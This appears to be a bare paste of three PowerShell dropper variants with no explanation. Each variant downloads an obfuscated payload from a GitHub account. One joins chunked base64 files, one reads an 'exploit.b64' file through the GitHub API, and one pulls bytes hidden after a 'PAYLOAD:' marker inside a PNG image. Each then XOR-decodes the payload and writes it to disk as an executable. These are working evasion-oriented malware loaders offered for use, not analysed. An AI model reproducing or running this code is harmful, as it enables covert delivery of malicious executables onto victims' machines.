
@@@@@ hello + hello 2

$base = "https://raw.githubusercontent.com/lowsig/REPO/main"
$wc   = New-Object Net.WebClient
$full = ""
0..20 | % {  # adjust upper bound to chunk count
    $name = "c{0:D3}.txt" -f $_
    try { $full += $wc.DownloadString("$base/$name") } catch {}
}
$enc = [Convert]::FromBase64String($full)
$dec = New-Object Byte[] $enc.Length
for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor 0xAA}
[IO.File]::WriteAllBytes("C:\installs\VSTO\s.exe",$dec)



@@@@ hello 3 

$j = (New-Object Net.WebClient).DownloadString("https://api.github.com/repos/lowsig/REPO/contents/exploit.b64")
$js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
$js.MaxJsonLength = 104857600
$b64 = ($js.DeserializeObject($j))["content"] -replace "`n",""
$enc = [Convert]::FromBase64String($b64)
$dec = New-Object Byte[] $enc.Length
for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor 0xAA}
[IO.File]::WriteAllBytes("C:\installs\VSTO\s.exe",$dec)



@@@@ hello4 

$wc = New-Object Net.WebClient
$img = $wc.DownloadData("https://raw.githubusercontent.com/lowsig/REPO/main/update.png")

$marker = [System.Text.Encoding]::ASCII.GetBytes("PAYLOAD:")
$start = 0
for($i=0;$i -lt $img.Length-8;$i++){
    $match=$true
    for($j=0;$j -lt 8;$j++){if($img[$i+$j] -ne $marker[$j]){$match=$false;break}}
    if($match){$start=$i+8;break}
}
$enc = $img[$start..($img.Length-1)]
$dec = New-Object Byte[] $enc.Length
for($i=0;$i -lt $enc.Length;$i++){$dec[$i]=$enc[$i] -bxor 0xAA}
[IO.File]::WriteAllBytes("C:\installs\VSTO\s.exe",$dec)